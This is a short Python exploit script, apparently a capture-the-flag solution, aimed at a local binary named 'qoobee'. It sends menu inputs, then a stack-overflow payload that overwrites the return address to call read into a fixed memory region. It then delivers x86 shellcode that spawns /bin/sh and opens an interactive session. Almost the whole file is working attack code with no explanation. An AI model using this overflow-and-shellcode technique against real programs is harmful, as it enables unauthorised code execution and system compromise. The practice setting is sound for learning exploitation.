'''
name stack overflow
patched in qoobee3
'''
from zio import *

target = './qoobee'
io = zio(target)

read_buf = l32(0x804c090)
call_edx = l32(0x0804887d)
str_flag = l32(0x08049F7E)
str_r = l32(0x08049F7C)
s = l32(0xffffce8d)
extern = l32(0x0804b7cc)
leave_ret = l32(0x08048a4f)
ppr = l32(0x0804992a)
pppr = l32(0x08049929)
# shellcode tiny sh
shellcode = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
read_got = l32(0x08048660)
fopen_got = l32(0x08048780)
write_got = l32(0x08048760)
data = l32(0x0804B7A8)
bss = l32(0x0804b7c0)
memcpy_got = l32(0x08048690)
mmap_got =l32(0x08048730)

payload =''

# function -214 mmap
payload += '-214\n'
payload += '9999999\n'

# function 1
payload += '1\n'

# junk
payload += '\x00' + '\x90'*59 #2222

# ebp
payload += l32(0x804b7e0)

# eip read
payload += read_got

# read ret to 0x80000004
payload += l32(0x80000004)

# read args
payload += l32(0x0)
payload += l32(0x80000000)
payload += l32(0x80)
payload += '\n'

# input age
payload += 'aaaa\n'

# read shellcode to exec
payload += shellcode

io.write(payload)
io.interact()
